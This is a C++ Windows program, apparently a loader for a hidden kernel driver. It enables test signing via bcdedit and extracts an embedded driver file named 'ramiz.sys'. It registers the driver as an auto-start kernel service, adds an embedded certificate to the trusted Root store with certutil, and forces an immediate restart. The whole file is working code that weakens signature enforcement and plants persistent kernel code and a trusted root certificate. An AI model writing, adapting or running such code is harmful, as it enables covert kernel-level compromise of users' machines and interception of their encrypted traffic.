#define ID_MANIFEST 1
#ifndef RT_MANIFEST
#define RT_MANIFEST MAKEINTRESOURCE(24)
#endif

#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <direct.h>
#include "driver_data.h"
#include "certificate_data.h" // Make sure this header file contains the certificate data

bool RunCommandInCmd(const std::string& command) {
    // Prepare the command line
    std::string cmdLine = "cmd.exe /c " + command;

    // Set up the process information and startup info
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create the process
    if (!CreateProcessA(NULL, const_cast<LPSTR>(cmdLine.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to run command in cmd: " << GetLastError() << std::endl;
        return false;
    }

    // Wait until the command finishes
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

bool IsUserAnAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;

    // Get the SID for the administrators group.
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &administratorsGroup)) {

        // Check whether the token is in the administrators group.
        if (CheckTokenMembership(NULL, administratorsGroup, &isAdmin) == 0) {
            isAdmin = FALSE;
        }

        FreeSid(administratorsGroup);
    }

    return isAdmin;
}

bool SetTestSigningMode() {
    if (!IsUserAnAdmin()) {
        std::cerr << "You must run this application as an administrator to set test signing mode." << std::endl;
        return false;
    }
    
    return RunCommandInCmd("bcdedit.exe /set testsigning on");
}

bool CreateDirectoryIfNotExists(const char* path) {
    if (_mkdir(path) == 0 || errno == EEXIST) {
        return true;
    } else {
        return false;
    }
}

bool ExtractDriver(const std::string& path) {
    std::ofstream file(path, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }
    file.write(reinterpret_cast<const char*>(driverData), driverData_len);
    file.close();
    return true;
}

bool CreateService() {
    std::string serviceName = "ramizdayi";
    std::string driverPath = "C:\\utkubabaproheckledibizikraladam\\ramiz.sys";

    // Create the service (set to start automatically)
    std::string createServiceCmd = "sc create " + serviceName + " binPath= \"" + driverPath + "\" type= kernel start= auto";
    
    return RunCommandInCmd(createServiceCmd);
}

void RestartSystem() {
    // Restart the system
    if (IsUserAnAdmin()) {
        // Shut down the system and restart
        if (!RunCommandInCmd("shutdown /r /t 0")) {
            std::cerr << "Failed to initiate system restart." << std::endl;
        }
    } else {
        std::cerr << "You must run this application as an administrator to restart the system." << std::endl;
    }
}

bool WriteCertificateToFile(const std::string& filePath) {
    std::ofstream certFile(filePath, std::ios::binary);
    if (!certFile.is_open()) {
        std::cerr << "Failed to create certificate file." << std::endl;
        return false;
    }
    certFile.write(reinterpret_cast<const char*>(certificateData), certificateData_len); // Use the certificate data from the header
    certFile.close();
    return true;
}

void InstallCertificate() {
    // Path to the certificate file
    std::string certPath = "C:\\utkubabaproheckledibizikraladam\\UTKUBABAPRO.cer";

    // Write the certificate data to a file
    if (WriteCertificateToFile(certPath)) {
        // Run the command to add the certificate to the Root store
        if (!RunCommandInCmd("certutil -addstore \"Root\" \"" + certPath + "\"")) {
            std::cerr << "Failed to add certificate to the Root store." << std::endl;
        }
    } else {
        std::cerr << "Failed to write certificate to file." << std::endl;
    }
}

void RunTasks() {
    const std::string dirPath = "C:\\utkubabaproheckledibizikraladam";
    const std::string driverPath = dirPath + "\\ramiz.sys";

    // Run necessary configuration tasks
    SetTestSigningMode();           // Enable test signing
    CreateDirectoryIfNotExists(dirPath.c_str()); // Create directory for the driver

    ExtractDriver(driverPath);      // Extract the driver
    CreateService();                // Create the driver service (set to start automatically)

    InstallCertificate();           // Install the certificate
    RestartSystem();                // Restart the system
}

int main() {
    // Run all tasks directly without service control
    RunTasks();
    return 0; // Exit after running tasks
}
